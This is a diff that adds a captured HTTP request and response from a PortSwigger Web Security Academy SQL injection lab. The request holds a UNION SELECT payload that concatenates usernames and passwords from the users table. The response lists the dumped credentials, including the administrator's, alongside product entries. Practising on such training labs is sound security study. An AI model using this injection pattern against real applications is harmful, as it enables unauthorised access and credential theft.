@@ -1,0 +1,119 @@
+GET https://0acc0037039e480c8291bf7b0037002f.web-security-academy.net/filter?category=Pets'%20union%20select%20null,concat(username,'~',password)%20from%20users-- HTTP/1.1
+host: 0acc0037039e480c8291bf7b0037002f.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Referer: https://0acc0037039e480c8291bf7b0037002f.web-security-academy.net/
+Cookie: session=mMqvZd6uQmZIQc423oW9IUR5TPpeKcbV
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+content-length: 0
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 5172
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
+        <title>SQL injection UNION attack, retrieving multiple values in a single column</title>
+    </head>
+    <body>
+        <script src="/resources/labheader/js/labHeader.js"></script>
+        <div id="academyLabHeader">
+            <section class='academyLabBanner'>
+                <div class=container>
+                    <div class=logo></div>
+                        <div class=title-container>
+                            <h2>SQL injection UNION attack, retrieving multiple values in a single column</h2>
+                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
+                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column'>
+                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                    <g>
+                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                    </g>
+                                </svg>
+                            </a>
+                        </div>
+                        <div class='widgetcontainer-lab-status is-notsolved'>
+                            <span>LAB</span>
+                            <p>Not solved</p>
+                            <span class=lab-status-icon></span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+        <div theme="ecommerce">
+            <section class="maincontainer">
+                <div class="container is-page">
+                    <header class="navigation-header">
+                        <section class="top-links">
+                            <a href=/>Home</a><p>|</p>
+                            <a href="/my-account">My account</a><p>|</p>
+                        </section>
+                    </header>
+                    <header class="notification-header">
+                    </header>
+                    <section class="ecoms-pageheader">
+                        <img src="/resources/images/shop.svg">
+                    </section>
+                    <section class="ecoms-pageheader">
+                        <h1>Pets&apos; union select null,concat(username,&apos;~&apos;,password) from users--</h1>
+                    </section>
+                    <section class="search-filters">
+                        <label>Refine your search:</label>
+                        <a class="filter-category" href="/">All</a>
+                        <a class="filter-category" href="/filter?category=Accessories">Accessories</a>
+                        <a class="filter-category" href="/filter?category=Corporate+gifts">Corporate gifts</a>
+                        <a class="filter-category" href="/filter?category=Food+%26+Drink">Food & Drink</a>
+                        <a class="filter-category" href="/filter?category=Pets">Pets</a>
+                        <a class="filter-category" href="/filter?category=Tech+gifts">Tech gifts</a>
+                    </section>
+                    <table class="is-table-list">
+                        <tbody>
+                        <tr>
+                            <th>wiener~5o5uckq0h1akt58lyyzk</th>
+                        </tr>
+                        <tr>
+                            <th>The Lazy Dog</th>
+                            <td><a class="button is-small" href="/product?productId=3">View details</a></td>
+                        </tr>
+                        <tr>
+                            <th>More Than Just Birdsong</th>
+                            <td><a class="button is-small" href="/product?productId=13">View details</a></td>
+                        </tr>
+                        <tr>
+                            <th>administrator~cf1i379ofej5ejiauhhu</th>
+                        </tr>
+                        <tr>
+                            <th>carlos~nb1jl012lvncrsxnkh30</th>
+                        </tr>
+                        <tr>
+                            <th>Giant Grasshopper</th>
+                            <td><a class="button is-small" href="/product?productId=8">View details</a></td>
+                        </tr>
+                        <tr>
+                            <th>Fur Babies</th>
+                            <td><a class="button is-small" href="/product?productId=18">View details</a></td>
+                        </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+            <div class="footer-wrapper">
+            </div>
+        </div>
+    </body>
+</html>
